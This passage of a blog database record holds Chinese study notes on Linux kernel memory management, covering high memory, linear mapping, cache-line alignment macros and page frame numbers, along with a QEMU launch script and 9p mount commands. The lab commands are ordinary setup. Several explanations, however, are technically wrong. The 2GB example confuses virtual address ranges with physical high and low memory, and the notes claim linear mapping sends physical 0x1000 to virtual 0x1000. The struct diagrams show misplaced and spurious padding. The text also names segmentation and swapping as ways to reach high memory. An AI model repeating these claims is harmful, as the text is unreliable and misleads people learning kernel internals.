0x1000。\n\t•\t内核的线性映射：在内核中，低端内存通常会通过线性映射被直接映射到内核虚拟地址空间中，这样内核可以直接访问这些物理内存。\n\t•\t高端内存与线性映射的关系：在 32 位系统中，高端内存并不会直接映射到内核的虚拟地址空间。也就是说，高端内存的物理页面没有通过线性映射直接映射到内核空间的虚拟地址，而需要通过其他机制（如交换、分段、分页）来访问。\n\n3. 虚拟地址与物理地址\n\n在 Linux 内核中，struct page 结构体代表物理内存页面，其中有一个 virtual 字段，它通常指向该物理页面对应的虚拟地址。\n\t•\t对于低端内存，内核可以通过线性映射将物理地址直接映射到虚拟地址，所以 virtual 字段会直接指向内核虚拟地址空间中的一个地址。\n\t•\t对于高端内存，由于内核的虚拟地址空间可能没有直接映射到物理页面，virtual 字段可能为空或指向一个特殊的虚拟地址，这个虚拟地址通常是通过一些额外的机制（如交换或者高端内存的分页）来实现访问的。\n\n4. 总结\n\t•\t高端内存：指的是那些在 32 位系统中，由于地址空间限制，不能直接映射到内核虚拟地址空间的物理内存。\n\t•\t线性映射：是一种将物理地址直接映射到虚拟地址的机制。在 32 位系统中，低端内存是线性映射的，但高端内存则无法直接映射到内核的虚拟地址空间。\n\t•\t对于高端内存，内核通过 分段 或 分页 等方式来访问这些内存区域，而不直接通过线性映射进行访问。\n\n因此，“高端内存不会线性映射到内核地址空间” 是指，高端内存的物理页面并不能像低端内存那样通过简单的线性映射直接访问，而需要通过其他机制来访问。\n\n在 32 位系统中，由于虚拟地址空间的大小限制，内核无法直接访问所有物理内存，尤其是当物理内存大于 1GB 时。这主要是因为 32 位系统的虚拟地址空间只有 4GB，而这个空间被划分为用户空间和内核空间。\n\n32 位系统的虚拟地址空间划分\n\t•\t虚拟地址空间总大小：在 32 位系统中，虚拟地址空间的总大小为 4GB（2^32）。\n\t•\t用户空间：通常使用 3GB 的地址空间（0x00000000 到 0xBFFFFFFF）。\n\t•\t内核空间：剩余的 1GB 用于内核空间（0xC0000000 到 0xFFFFFFFF）。\n\n因此，在 32 位系统中，内核最多只能直接访问 1GB 的物理内存。如果系统的物理内存大于 1GB，那么这部分内存就无法直接映射到内核虚拟地址空间中，这部分内存就属于 高端内存（High Memory）。\n\n举个例子\n\n假设一台 32 位的计算机具有 2GB 的物理内存：\n\t•\t物理内存：2GB（2^31 字节），其中包括低端内存（Low Memory）和高端内存（High Memory）。\n\t•\t低端内存：在虚拟地址空间中的前 1GB（0x00000000 到 0xBFFFFFFF），可以直接映射到内核空间。\n\t•\t高端内存：超出 1GB 的内存（0xC0000000 到 0xFFFFFFFF 之间的内存）不能直接映射到内核虚拟地址空间，因为内核空间已经满了。\n\n在这种情况下，物理内存的前 1GB（低端内存）可以通过内核的线性映射直接访问，而物理内存中超过 1GB 的部分（高端内存）则无法通过简单的线性映射直接访问。这就意味着，内核无法直接访问这些高端内存中的页面。\n\n如何访问高端内存\n\n虽然高端内存不能直接通过线性映射访问，但内核提供了其他机制来访问它：\n\t1.\t通过 vmalloc() 和 kmap() 访问：内核会通过 vmalloc() 和 kmap() 等机制将高端内存映射到内核的虚拟地址空间中，从而允许内核访问这些内存。高端内存不直接映射到内核虚拟地址空间，而是通过分页的方式进行分段映射。\n\t2.\t通过 highmem（高端内存）区访问：高端内存通常会在内核中通过 highmem 区域进行管理。内核通过特殊的内存管理函数来访问这部分内存，通常需要进行分页或其他方式来映射。\n\n为什么高端内存不能直接映射\n\n主要原因是虚拟地址空间的限制。在 32 位系统中，内核空间最大只能有 1GB，因此如果物理内存超过 1GB，剩余的内存就不能直接映射到内核空间。这就迫使内核通过特殊的分页技术来访问这些高端内存。\n\n64 位系统的改进\n\n在 64 位系统中，虚拟地址空间大大增加，内核可以直接访问大多数物理内存，无需像 32 位系统那样处理高端内存的问题。64 位系统的虚拟地址空间可以达到 2^64，几乎不再受到地址空间大小的限制，因此不再需要像在 32 位系统中那样对高端内存进行特殊处理。\n\n\n好的，让我们重新梳理一下这段代码的逻辑，并且通过一个具体的例子来深入理解它的含义和作用。\n\n背景：为什么需要按缓存行对齐\n\n在多核处理器（SMP）系统中，缓存一致性和数据访问效率非常关键。缓存行（Cache Line）是 CPU 缓存中最小的存储单位，大多数现代处理器的缓存行大小通常为 64 字节。如果一个数据结构跨越了两个或多个缓存行，那么访问该数据时就可能导致 缓存行失效（cache line ping-pong），即每个 CPU 核心都在不同的缓存行中加载同一个数据，导致性能下降。因此，将数据按缓存行对齐可以避免这个问题，确保数据尽量放置在单独的缓存行中，从而提高性能。\n\n分析这段代码的作用\n\n#if !defined(____cacheline_internodealigned_in_smp)\n#if defined(CONFIG_SMP)\n#define ____cacheline_internodealigned_in_smp \\\n    __attribute__((__aligned__(1 << (INTERNODE_CACHE_SHIFT))))\n#else\n#define ____cacheline_internodealigned_in_smp\n#endif\n#endif\n\n这段代码的目的是根据系统是否支持 SMP（对称多处理）（即是否有多个 CPU 核心）来决定是否为数据结构设置缓存行对齐属性。\n\n代码解释\n\t1.\t#if !defined(____cacheline_internodealigned_in_smp)\n这一行检查是否已经定义了宏 ____cacheline_internodealigned_in_smp。如果没有定义，才会继续定义它，避免重复定义。\n\t2.\t#if defined(CONFIG_SMP)\n这行检查是否定义了 CONFIG_SMP。CONFIG_SMP 是一个内核配置选项，表示是否启用了对称多处理（即是否有多个 CPU 核心）。\n\t•\t如果启用了 SMP（多核处理），则进行缓存行对齐的处理。\n\t•\t如果没有启用 SMP（单核系统），则不进行缓存行对齐。\n\t3.\t#define ____cacheline_internodealigned_in_smp \\\n如果启用了 SMP（即 CONFIG_SMP 被定义），则定义 ____cacheline_internodealigned_in_smp 为 __attribute__((__aligned__(1 << (INTERNODE_CACHE_SHIFT))))。\n\t•\tINTERNODE_CACHE_SHIFT 是一个宏，通常表示缓存行大小的对数。例如，如果缓存行大小是 64 字节，那么 INTERNODE_CACHE_SHIFT 就是 6，因为 64 = 2^6。\n\t•\t__attribute__((__aligned__(...))) 是 GCC 提供的一个编译器属性，表示将数据对齐到指定的字节边界。\n\t•\t1 << (INTERNODE_CACHE_SHIFT) 表示将数据对齐到 64 字节的边界。\n所以，启用 SMP 时，____cacheline_internodealigned_in_smp 宏会被定义为 __attribute__((__aligned__(64)))，这确保数据会按 64 字节对齐。\n\t4.\t#else\n如果没有启用 SMP（单核系统），则 ____cacheline_internodealigned_in_smp 不会做任何事情，即不做对齐操作。\n\t5.\t#endif\n结束条件编译语句。\n\n总结：\n\t•\tSMP（多核系统）：如果系统支持多核，____cacheline_internodealigned_in_smp 被定义为 __attribute__((__aligned__(64)))，确保数据按缓存行（64 字节）对齐，从而减少缓存失效的风险。\n\t•\t单核系统：不做缓存行对齐操作。\n\n具体例子：\n\n假设我们有一个结构体，并希望在多核处理器系统中确保它按缓存行对齐：\n\nstruct my_struct {\n    int a;\n    char b;\n    float c;\n};\n\n没有对齐的情况：\n\n在没有使用 ____cacheline_internodealigned_in_smp 时，编译器会根据结构体成员的对齐要求来确定内存布局：\n\t•\tint 通常需要对齐到 4 字节边界。\n\t•\tchar 通常对齐到 1 字节边界。\n\t•\tfloat 通常对齐到 4 字节边界。\n\n如果这个结构体没有使用缓存行对齐，内存布局可能像这样：\n\n+--------+-------+--------+--------+\n|   a    |   b   |   c    | padding|\n+--------+-------+--------+--------+\n  4 bytes   1 byte   4 bytes   3 bytes\n\n\t•\ta 占用 4 字节并对齐到 4 字节。\n\t•\tb 占用 1 字节，并且它的对齐要求为 1 字节。\n\t•\tc 占用 4 字节，并且对齐到 4 字节。\n\n为了使 c 能对齐到 4 字节，可能需要在 b 后添加 3 字节的填充。\n\n启用缓存行对齐后的情况：\n\n现在，假设启用了 ____cacheline_internodealigned_in_smp，并且系统支持 SMP（多核）。这时，结构体会按 64 字节对齐，也就是说，结构体的起始地址会对齐到 64 字节的边界。\n\n假设 INTERNODE_CACHE_SHIFT = 6，即缓存行大小为 64 字节，结构体的内存布局会变成：\n\n+-----------------------------------+\n|   Padding (64 bytes)              |\n+-----------------------------------+\n|   a   |   b   |   c   |   padding |\n+-----------------------------------+\n  4 bytes   1 byte   4 bytes   55 bytes\n\n\t•\t结构体的首地址被对齐到 64 字节的边界。\n\t•\t内存填充：由于结构体本身的大小是 12 字节，但为了保证结构体的起始地址是 64 字节的倍数，结构体会被填充到 64 字节的边界。即，结构体的起始位置可能会有 64 字节的填充。\n\n效果和意义：\n\t•\t避免缓存失效：将数据对齐到缓存行的边界可以减少跨越缓存行的访问，从而减少缓存失效。\n\t•\t性能优化：对于多核系统，避免数据跨越多个缓存行能提高内存访问效率，减少 CPU 核心间的缓存一致性问题。\n\n总结：\n\t•\t这段代码的核心目的是在 多核处理器（SMP）系统 中，将结构体的起始地址对齐到 64 字节的边界，以减少缓存一致性问题和提高访问效率。\n\t•\t按缓存行对齐确保数据结构在内存中的布局能够有效利用 CPU 缓存，避免多个 CPU 核心间由于访问同一数据而导致的缓存行失效问题。\n\n\n### 9.2\n在 Linux 内核中，“PFN”（Page Frame Number，页帧号）是用来索引物理页（physical page）的一种整数编号。下面分别解释代码里的两个概念：\n\n1. ARCH_PFN_OFFSET 是什么？\n\n在一些架构上（尤其是 ARM、MIPS 等嵌入式或移动平台），物理内存不一定从物理地址 0x00000000 开始，也可能从更高的物理地址起步（例如某些平台保留了低地址做其他映射、外设 IO 等）。\n\t•\tARCH_PFN_OFFSET 就是为了对齐“页帧号（PFN）”和实际物理地址而引入的一个“偏移量”。\n\t•\tPFN 是“物理地址 / PAGE_SIZE”的逻辑编号。如果系统的物理地址不是从 0 起步，而是从某个偏移地址开始，那么 ARCH_PFN_OFFSET 就用于在内核中对这些 PFN 进行校正。\n\n简而言之：ARCH_PFN_OFFSET = (物理内存起始地址) / PAGE_SIZE（在特定平台中可能还含有更多固定映射或保留区间导致的修正）。\n\n在大多数常见的 x86_64 PC 服务器或桌面上，ARCH_PFN_OFFSET 一般为 0；而在某些嵌入式或 ARM 平台上，这个值会是一个正整数，让内核知道第一个可用物理页帧编号实际是多少。\n\n2. pfn 是什么？\n\npfn 是 “Page Frame Number”（页帧号），用来标识系统中的第几页物理内存。\n\t•\t如果 PAGE_SIZE = 4KB，那么 PFN=0 指向物理地址 0x00000000 ~ 0x00000FFF 这一页；PFN=1 对应 0x00001000 ~ 0x00001FFF，依此类推。\n\t•\t因此 pfn 与物理地址的关系：\n\n物理地址 = pfn * PAGE_SIZE\n\n\n\t•\t内核提供了 pfn_to_page(pfn) 这样的方法，把一个 PFN 转换为对应的 struct page *，这样就能访问或操作该物理页的元数据。\n\n在这段代码里：\n\npfn = i + ARCH_PFN_OFFSET;\nif (!pfn_valid(pfn))\n    continue;\np = pfn_to_page(pfn);\n...\n\n\t•\ti 从 0 遍历到 num_physpages（即系统总共可见的物理页数），然后加上 ARCH_PFN_OFFSET 得到实际有效的 PFN。\n\t•\tpfn_valid(pfn) 检查这个 PFN 是否属于系统真正存在或可管理的物理内存区域，可能有的 PFN 范围并没有对应物理页（例如“洞”（holes）或保留区）。\n\t•\t如果是有效 PFN，再用 pfn_to_page() 拿到对应的 struct page 描述符，然后进行各种标记检查（如 PageLocked、PageDirty 等）。\n\n小结\n\t•\tARCH_PFN_OFFSET：平台/架构相关的 PFN 偏移，用于对齐实际物理地址在页帧编号体系中的起点。\n\t•\tpfn：Page Frame Number，标识物理页的编号，用于在内核中管理、索引所有物理页面。","slug":"kernelLinux","published":0,"date":"2024-07-12T15:52:34.901Z","updated":"2025-06-24T14:29:53.257Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risz000bv8fya1pqcjb5","content":"<p><a href=\"https://blog.csdn.net/thisinnocence/article/details/127931774\">https://blog.csdn.net/thisinnocence/article/details/127931774</a><br>安装linux内核<br>qemu 脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">~/qemu-6.2.0/build/qemu-system-aarch64 \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -M virt \\</span><br><span class=\"line\">    -cpu cortex-a57 \\</span><br><span class=\"line\">    -smp 2 \\</span><br><span class=\"line\">    -m 4G \\</span><br><span class=\"line\">    -kernel linux-6.7.12/build/arch/arm64/boot/Image \\</span><br><span class=\"line\">    -append &quot;nokaslr root=/dev/ram init=/linuxrc console=ttyAMA0 console=ttyS0&quot; \\</span><br><span class=\"line\">    -initrd initrd.ext4 \\</span><br><span class=\"line\">    -fsdev local,id=fsdev0,path=/home/nuoen/linux-6.7.12/LinuxLearn,security_model=passthrough \\</span><br><span class=\"line\">    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=host0 \\</span><br><span class=\"line\">    -monitor unix:/tmp/qemu-monitor-socket,server,nowait \\</span><br><span class=\"line\">    -incoming &quot;exec:cat ./savefile.img&quot;</span><br></pre></td></tr></table></figure>\n<p>共享空间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt # mkdir host</span><br><span class=\"line\">/mnt # mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/host</span><br></pre></td></tr></table></figure>\n\n\n<p>进入qemu<br><code>socat UNIX-CONNECT:/tmp/qemu-monitor-socket -</code></p>\n<p>保存镜像<br><code>(qemu) migrate &quot;exec:cat &gt; ./savefile.img&quot;</code><br>注意：保存镜像时，要先取消共享空间的挂载<br><code>umount /mnt/host</code></p>\n<h2 id=\"内存管理\"><a href=\"#内存管理\" class=\"headerlink\" title=\"内存管理\"></a>内存管理</h2><ol>\n<li>高端内存（High Memory）</li>\n</ol>\n<p>高端内存（High Memory） 是一种相对于内核空间中的“低端内存”（Low Memory）概念的术语。它指的是一些物理内存区域，特别是在 32 位系统中，由于地址空间的限制，它们无法直接映射到内核的虚拟地址空间中。通常，高端内存是指那些超出了内核直接映射到虚拟地址空间的物理内存区域。<br>    •    32 位系统的地址空间限制：在传统的 32 位系统中，虚拟地址空间通常只有 4GB，而其中的一部分（通常 3GB）用于用户空间，剩下的（通常 1GB）用于内核空间。由于这个限制，内核不能直接访问所有的物理内存，尤其是对于大于 1GB 的内存，无法直接映射到内核的虚拟地址空间中。因此，高端内存指的是位于内核虚拟地址空间映射范围之外的物理内存。<br>    •    64 位系统：由于 64 位系统的地址空间极其庞大，内核几乎可以直接访问所有物理内存，因此在 64 位系统中没有高端内存的概念。</p>\n<ol start=\"2\">\n<li>线性映射</li>\n</ol>\n<p>线性映射 是一种将物理地址空间直接映射到虚拟地址空间的方式。在这种映射方式下，物理地址与虚拟地址是等价的或者是一个固定的偏移量。例如，内核在启动时会设置一些映射，使得物理地址 0x1000 会直接映射到虚拟地址 0x1000。<br>    •    内核的线性映射：在内核中，低端内存通常会通过线性映射被直接映射到内核虚拟地址空间中，这样内核可以直接访问这些物理内存。<br>    •    高端内存与线性映射的关系：在 32 位系统中，高端内存并不会直接映射到内核的虚拟地址空间。也就是说，高端内存的物理页面没有通过线性映射直接映射到内核空间的虚拟地址，而需要通过其他机制（如交换、分段、分页）来访问。</p>\n<ol start=\"3\">\n<li>虚拟地址与物理地址</li>\n</ol>\n<p>在 Linux 内核中，struct page 结构体代表物理内存页面，其中有一个 virtual 字段，它通常指向该物理页面对应的虚拟地址。<br>    •    对于低端内存，内核可以通过线性映射将物理地址直接映射到虚拟地址，所以 virtual 字段会直接指向内核虚拟地址空间中的一个地址。<br>    •    对于高端内存，由于内核的虚拟地址空间可能没有直接映射到物理页面，virtual 字段可能为空或指向一个特殊的虚拟地址，这个虚拟地址通常是通过一些额外的机制（如交换或者高端内存的分页）来实现访问的。</p>\n<ol start=\"4\">\n<li>总结<br> •    高端内存：指的是那些在 32 位系统中，由于地址空间限制，不能直接映射到内核虚拟地址空间的物理内存。<br> •    线性映射：是一种将物理地址直接映射到虚拟地址的机制。在 32 位系统中，低端内存是线性映射的，但高端内存则无法直接映射到内核的虚拟地址空间。<br> •    对于高端内存，内核通过 分段 或 分页 等方式来访问这些内存区域，而不直接通过线性映射进行访问。</li>\n</ol>\n<p>因此，“高端内存不会线性映射到内核地址空间” 是指，高端内存的物理页面并不能像低端内存那样通过简单的线性映射直接访问，而需要通过其他机制来访问。</p>\n<p>在 32 位系统中，由于虚拟地址空间的大小限制，内核无法直接访问所有物理内存，尤其是当物理内存大于 1GB 时。这主要是因为 32 位系统的虚拟地址空间只有 4GB，而这个空间被划分为用户空间和内核空间。</p>\n<p>32 位系统的虚拟地址空间划分<br>    •    虚拟地址空间总大小：在 32 位系统中，虚拟地址空间的总大小为 4GB（2^32）。<br>    •    用户空间：通常使用 3GB 的地址空间（0x00000000 到 0xBFFFFFFF）。<br>    •    内核空间：剩余的 1GB 用于内核空间（0xC0000000 到 0xFFFFFFFF）。</p>\n<p>因此，在 32 位系统中，内核最多只能直接访问 1GB 的物理内存。如果系统的物理内存大于 1GB，那么这部分内存就无法直接映射到内核虚拟地址空间中，这部分内存就属于 高端内存（High Memory）。</p>\n<p>举个例子</p>\n<p>假设一台 32 位的计算机具有 2GB 的物理内存：<br>    •    物理内存：2GB（2^31 字节），其中包括低端内存（Low Memory）和高端内存（High Memory）。<br>    •    低端内存：在虚拟地址空间中的前 1GB（0x00000000 到 0xBFFFFFFF），可以直接映射到内核空间。<br>    •    高端内存：超出 1GB 的内存（0xC0000000 到 0xFFFFFFFF 之间的内存）不能直接映射到内核虚拟地址空间，因为内核空间已经满了。</p>\n<p>在这种情况下，物理内存的前 1GB（低端内存）可以通过内核的线性映射直接访问，而物理内存中超过 1GB 的部分（高端内存）则无法通过简单的线性映射直接访问。这就意味着，内核无法直接访问这些高端内存中的页面。</p>\n<p>如何访问高端内存</p>\n<p>虽然高端内存不能直接通过线性映射访问，但内核提供了其他机制来访问它：<br>    1.    通过 vmalloc() 和 kmap() 访问：内核会通过 vmalloc() 和 kmap() 等机制将高端内存映射到内核的虚拟地址空间中，从而允许内核访问这些内存。高端内存不直接映射到内核虚拟地址空间，而是通过分页的方式进行分段映射。<br>    2.    通过 highmem（高端内存）区访问：高端内存通常会在内核中通过 highmem 区域进行管理。内核通过特殊的内存管理函数来访问这部分内存，通常需要进行分页或其他方式来映射。</p>\n<p>为什么高端内存不能直接映射</p>\n<p>主要原因是虚拟地址空间的限制。在 32 位系统中，内核空间最大只能有 1GB，因此如果物理内存超过 1GB，剩余的内存就不能直接映射到内核空间。这就迫使内核通过特殊的分页技术来访问这些高端内存。</p>\n<p>64 位系统的改进</p>\n<p>在 64 位系统中，虚拟地址空间大大增加，内核可以直接访问大多数物理内存，无需像 32 位系统那样处理高端内存的问题。64 位系统的虚拟地址空间可以达到 2^64，几乎不再受到地址空间大小的限制，因此不再需要像在 32 位系统中那样对高端内存进行特殊处理。</p>\n<p>好的，让我们重新梳理一下这段代码的逻辑，并且通过一个具体的例子来深入理解它的含义和作用。</p>\n<p>背景：为什么需要按缓存行对齐</p>\n<p>在多核处理器（SMP）系统中，缓存一致性和数据访问效率非常关键。缓存行（Cache Line）是 CPU 缓存中最小的存储单位，大多数现代处理器的缓存行大小通常为 64 字节。如果一个数据结构跨越了两个或多个缓存行，那么访问该数据时就可能导致 缓存行失效（cache line ping-pong），即每个 CPU 核心都在不同的缓存行中加载同一个数据，导致性能下降。因此，将数据按缓存行对齐可以避免这个问题，确保数据尽量放置在单独的缓存行中，从而提高性能。</p>\n<p>分析这段代码的作用</p>\n<p>#if !defined(____cacheline_internodealigned_in_smp)<br>#if defined(CONFIG_SMP)<br>#define ____cacheline_internodealigned_in_smp <br>    <strong>attribute</strong>((<strong>aligned</strong>(1 &lt;&lt; (INTERNODE_CACHE_SHIFT))))<br>#else<br>#define ____cacheline_internodealigned_in_smp<br>#endif<br>#endif</p>\n<p>这段代码的目的是根据系统是否支持 SMP（对称多处理）（即是否有多个 CPU 核心）来决定是否为数据结构设置缓存行对齐属性。</p>\n<p>代码解释<br>    1.    #if !defined(____cacheline_internodealigned_in_smp)<br>这一行检查是否已经定义了宏 ____cacheline_internodealigned_in_smp。如果没有定义，才会继续定义它，避免重复定义。<br>    2.    #if defined(CONFIG_SMP)<br>这行检查是否定义了 CONFIG_SMP。CONFIG_SMP 是一个内核配置选项，表示是否启用了对称多处理（即是否有多个 CPU 核心）。<br>    •    如果启用了 SMP（多核处理），则进行缓存行对齐的处理。<br>    •    如果没有启用 SMP（单核系统），则不进行缓存行对齐。<br>    3.    #define ____cacheline_internodealigned_in_smp <br>如果启用了 SMP（即 CONFIG_SMP 被定义），则定义 ____cacheline_internodealigned_in_smp 为 <strong>attribute</strong>((<strong>aligned</strong>(1 &lt;&lt; (INTERNODE_CACHE_SHIFT))))。<br>    •    INTERNODE_CACHE_SHIFT 是一个宏，通常表示缓存行大小的对数。例如，如果缓存行大小是 64 字节，那么 INTERNODE_CACHE_SHIFT 就是 6，因为 64 = 2^6。<br>    •    <strong>attribute</strong>((<strong>aligned</strong>(…))) 是 GCC 提供的一个编译器属性，表示将数据对齐到指定的字节边界。<br>    •    1 &lt;&lt; (INTERNODE_CACHE_SHIFT) 表示将数据对齐到 64 字节的边界。<br>所以，启用 SMP 时，____cacheline_internodealigned_in_smp 宏会被定义为 <strong>attribute</strong>((<strong>aligned</strong>(64)))，这确保数据会按 64 字节对齐。<br>    4.    #else<br>如果没有启用 SMP（单核系统），则 ____cacheline_internodealigned_in_smp 不会做任何事情，即不做对齐操作。<br>    5.    #endif<br>结束条件编译语句。</p>\n<p>总结：<br>    •    SMP（多核系统）：如果系统支持多核，____cacheline_internodealigned_in_smp 被定义为 <strong>attribute</strong>((<strong>aligned</strong>(64)))，确保数据按缓存行（64 字节）对齐，从而减少缓存失效的风险。<br>    •    单核系统：不做缓存行对齐操作。</p>\n<p>具体例子：</p>\n<p>假设我们有一个结构体，并希望在多核处理器系统中确保它按缓存行对齐：</p>\n<p>struct my_struct {<br>    int a;<br>    char b;<br>    float c;<br>};</p>\n<p>没有对齐的情况：</p>\n<p>在没有使用 ____cacheline_internodealigned_in_smp 时，编译器会根据结构体成员的对齐要求来确定内存布局：<br>    •    int 通常需要对齐到 4 字节边界。<br>    •    char 通常对齐到 1 字节边界。<br>    •    float 通常对齐到 4 字节边界。</p>\n<p>如果这个结构体没有使用缓存行对齐，内存布局可能像这样：</p>\n<p>+——–+——-+——–+——–+<br>|   a    |   b   |   c    | padding|<br>+——–+——-+——–+——–+<br>  4 bytes   1 byte   4 bytes   3 bytes</p>\n<pre><code>•    a 占用 4 字节并对齐到 4 字节。\n•    b 占用 1 字节，并且它的对齐要求为 1 字节。\n•    c 占用 4 字节，并且对齐到 4 字节。\n</code></pre>\n<p>为了使 c 能对齐到 4 字节，可能需要在 b 后添加 3 字节的填充。</p>\n<p>启用缓存行对齐后的情况：</p>\n<p>现在，假设启用了 ____cacheline_internodealigned_in_smp，并且系统支持 SMP（多核）。这时，结构体会按 64 字节对齐，也就是说，结构体的起始地址会对齐到 64 字节的边界。</p>\n<p>假设 INTERNODE_CACHE_SHIFT = 6，即缓存行大小为 64 字节，结构体的内存布局会变成：</p>\n<p>+———————————–+<br>|   Padding (64 bytes)              |<br>+———————————–+<br>|   a   |   b   |   c   |   padding |<br>+———————————–+<br>  4 bytes   1 byte   4 bytes   55 bytes</p>\n<pre><code>•    结构体的首地址被对齐到 64 字节的边界。\n•    内存填充：由于结构体本身的大小是 12 字节，但为了保证结构体的起始地址是 64 字节的倍数，结构体会被填充到 64 字节的边界。即，结构体的起始位置可能会有 64 字节的填充。\n</code></pre>\n<p>效果和意义：<br>    •    避免缓存失效：将数据对齐到缓存行的边界可以减少跨越缓存行的访问，从而减少缓存失效。<br>    •    性能优化：对于多核系统，避免数据跨越多个缓存行能提高内存访问效率，减少 CPU 核心间的缓存一致性问题。</p>\n<p>总结：<br>    •    这段代码的核心目的是在 多核处理器（SMP）系统 中，将结构体的起始地址对齐到 64 字节的边界，以减少缓存一致性问题和提高访问效率。<br>    •    按缓存行对齐确保数据结构在内存中的布局能够有效利用 CPU 缓存，避免多个 CPU 核心间由于访问同一数据而导致的缓存行失效问题。</p>\n<h3 id=\"9-2\"><a href=\"#9-2\" class=\"headerlink\" title=\"9.2\"></a>9.2</h3><p>在 Linux 内核中，“PFN”（Page Frame Number，页帧号）是用来索引物理页（physical page）的一种整数编号。下面分别解释代码里的两个概念：</p>\n<ol>\n<li>ARCH_PFN_OFFSET 是什么？</li>\n</ol>\n<p>在一些架构上（尤其是 ARM、MIPS 等嵌入式或移动平台），物理内存不一定从物理地址 0x00000000 开始，也可能从更高的物理地址起步（例如某些平台保留了低地址做其他映射、外设 IO 等）。<br>    •    ARCH_PFN_OFFSET 就是为了对齐“页帧号（PFN）”和实际物理地址而引入的一个“偏移量”。<br>    •    PFN 是“物理地址 / PAGE_SIZE”的逻辑编号。如果系统的物理地址不是从 0 起步，而是从某个偏移地址开始，那么 ARCH_PFN_OFFSET 就用于在内核中对这些 PFN 进行校正。</p>\n<p>简而言之：ARCH_PFN_OFFSET = (物理内存起始地址) / PAGE_SIZE（在特定平台中可能还含有更多固定映射或保留区间导致的修正）。</p>\n<p>在大多数常见的 x86_64 PC 服务器或桌面上，ARCH_PFN_OFFSET 一般为 0；而在某些嵌入式或 ARM 平台上，这个值会是一个正整数，让内核知道第一个可用物理页帧编号实际是多少。</p>\n<ol start=\"2\">\n<li>pfn 是什么？</li>\n</ol>\n<p>pfn 是 “Page Frame Number”（页帧号），用来标识系统中的第几页物理内存。<br>    •    如果 PAGE_SIZE = 4KB，那么 PFN=0 指向物理地址 0x00000000 ~ 0x00000FFF 这一页；PFN=1 对应 0x00001000 ~ 0x00001FFF，依此类推。<br>    •    因此 pfn 与物理地址的关系：</p>\n<p>物理地址 = pfn * PAGE_SIZE</p>\n<pre><code>•    内核提供了 pfn_to_page(pfn) 这样的方法，把一个 PFN 转换为对应的 struct page *，这样就能访问或操作该物理页的元数据。\n</code></pre>\n<p>在这段代码里：</p>\n<p>pfn = i + ARCH_PFN_OFFSET;<br>if (!pfn_valid(pfn))<br>    continue;<br>p = pfn_to_page(pfn);<br>…</p>\n<pre><code>•    i 从 0 遍历到 num_physpages（即系统总共可见的物理页数），然后加上 ARCH_PFN_OFFSET 得到实际有效的 PFN。\n•    pfn_valid(pfn) 检查这个 PFN 是否属于系统真正存在或可管理的物理内存区域，可能有的 PFN 范围并没有对应物理页（例如“洞”（holes）或保留区）。\n•    如果是有效 PFN，再用 pfn_to_page() 拿到对应的 struct page 描述符，然后进行各种标记检查（如 PageLocked、PageDirty 等）。\n</code></pre>\n<p>小结<br>    •    ARCH_PFN_OFFSET：平台/架构相关的 PFN 偏移，用于对齐实际物理地址在页帧编号体系中的起点。<br>    •    pfn：Page Frame Number，标识物理页的编号，用于在内核中管理、索引所有物理页面。</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p><a href=\"https://blog.csdn.net/thisinnocence/article/details/127931774\">https://blog.csdn.net/thisinnocence/article/details/127931774</a><br>安装linux内核<br>qemu 脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\">~/qemu-6.2.0/build/qemu-system-aarch64 \\</span><br><span class=\"line\">    -nographic \\</span><br><span class=\"line\">    -M virt \\</span><br><span class=\"line\">    -cpu cortex-a57 \\</span><br><span class=\"line\">    -smp 2 \\</span><br><span class=\"line\">    -m 4G \\</span><br><span class=\"line\">    -kernel linux-6.7.12/build/arch/arm64/boot/Image \\</span><br><span class=\"line\">    -append &quot;nokaslr root=/dev/ram init=/linuxrc console=ttyAMA0 console=ttyS0&quot; \\</span><br><span class=\"line\">    -initrd initrd.ext4 \\</span><br><span class=\"line\">    -fsdev local,id=fsdev0,path=/home/nuoen/linux-6.7.12/LinuxLearn,security_model=passthrough \\</span><br><span class=\"line\">    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=host0 \\</span><br><span class=\"line\">    -monitor unix:/tmp/qemu-monitor-socket,server,nowait \\</span><br><span class=\"line\">    -incoming &quot;exec:cat ./savefile.img&quot;</span><br></pre></td></tr></table></figure>\n<p>共享空间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt # mkdir host</span><br><span class=\"line\">/mnt # mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/host</span><br></pre></td></tr></table></figure>\n\n\n<p>进入qemu<br><code>socat UNIX-CONNECT:/tmp/qemu-monitor-socket -</code></p>\n<p>保存镜像<br><code>(qemu) migrate &quot;exec:cat &gt; ./savefile.img&quot;</code><br>注意：保存镜像时，要先取消共享空间的挂载<br><code>umount /mnt/host</code></p>\n<h2 